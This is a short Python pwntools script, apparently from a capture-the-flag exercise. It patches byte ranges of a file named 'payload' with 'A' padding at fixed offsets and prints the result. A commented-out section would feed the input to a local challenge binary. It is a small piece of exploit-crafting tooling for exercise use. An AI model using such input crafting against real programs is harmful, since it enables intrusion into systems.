from pwn import *

f = open("payload", "r")
text = f.read()
f.close()

# context.log_level = 'debug'

offset = 0x18
offset2 = 0x30
jump = 8
length = 0x4

payload = text[:offset]
payload += "A" * 0x18
payload += text[offset2: offset2 + jump]
payload += "A" * length
payload += text[offset2 + jump + length:]

print payload

"""
p = process("./faggin")
p.send(text)
p.close()
"""
